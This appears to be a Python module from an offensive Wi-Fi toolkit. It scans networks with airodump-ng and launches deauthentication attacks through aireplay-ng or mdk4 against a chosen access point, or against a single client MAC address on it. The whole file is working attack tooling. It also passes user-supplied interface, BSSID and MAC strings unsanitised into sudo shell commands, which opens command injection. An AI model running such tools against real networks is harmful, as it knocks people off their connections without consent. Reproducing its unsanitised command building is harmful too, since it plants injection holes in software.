import os, sys
from colorama import Fore
from src import print_slow, banner, logs

def clean():
    os.system("clear")

def scan(iface):
    logs.log(0, "scanning networks with airodump-ng")
    if os.system("sudo airodump-ng " + iface) > 2:
        logs.log(1, "[Error 6]; failed scanning networks with airodump-ng")
        print(Fore.RED + "\n[Error 6]" + Fore.RESET)
        sys.exit()
    logs.log(0, "network scanned")

def advancedScan(iface, bssid):
    logs.log(0, "scanning networks with airodump-ng")
    if os.system("sudo airodump-ng " + iface + " --bssid " + bssid) > 2:
        logs.log(0, "[Error 6]; failed scanning networks with airodump-ng")
        print(Fore.RED + "\n[Error 6]" + Fore.RESET)
        sys.exit()
    logs.log(0, "network scanned")

def deauth(iface, bssid):
    try:
        tool = 0
        print_slow.slow_type("\n\nEnter the tool:\n\n 1. aireplay-ng\n\n 2. mdk4\n")
        while(tool > 2 or tool < 1):
            tool = int(input("\n ==> "))
        clean()
        banner.bannerDeauth()
        print("\n\n")
        logs.log(0, "deautinticating")
        if tool == 1:
            if os.system("sudo aireplay-ng " + iface + " -0 100000 -a " + bssid) > 2:
                logs.log(1, "[Error 7]; failed launching aireplay-ng")
                print(Fore.RED + "\n[Error 7]" + Fore.RESET)
                sys.exit()
        if tool == 2:
            command = os.system("sudo mdk4 " + iface + " d -B " + bssid)
            if command > 2 and command != 33280:
                logs.log(1, "[Error 8]; failed launching mdk4")
                print(Fore.RED + "\n[Error 8]" + Fore.RESET)
                sys.exit()
        logs.log(0, "exiting")
    except KeyboardInterrupt:
        logs.log(0, "Keyboard Interrupt detected")
        pass

def deauthdv(iface, bssid, mac):
    try:
        tool = 0
        print_slow.slow_type("\n\nEnter the tool:\n\n 1. aireplay-ng\n\n 2. mdk4\n")
        tool = int(input("\n ==> "))
        clean()
        banner.bannerDeauth()
        print("\n\n")
        logs.log(0, "deautinticating")
        if tool == 1:
            if os.system("sudo aireplay-ng " + iface + " -0 -a " + bssid + " -d " + mac) > 2:
                logs.log(1, "[Error 7]; failed launching aireplay-ng")
                print(Fore.RED + "\n[Error 7]" + Fore.RESET)
                sys.exit()
        if tool == 2:
            command = os.system("sudo mdk4 " + iface + " d -B " + bssid + " -S " + mac)
            if command > 2 and command != 33280:
                logs.log(1, "[Error 8]; failed launching mdk4")
                print(Fore.RED + "\n[Error 8]" + Fore.RESET)
                sys.exit()
    except KeyboardInterrupt:
        logs.log(0, "Keyboard Interrupt detected")
        pass
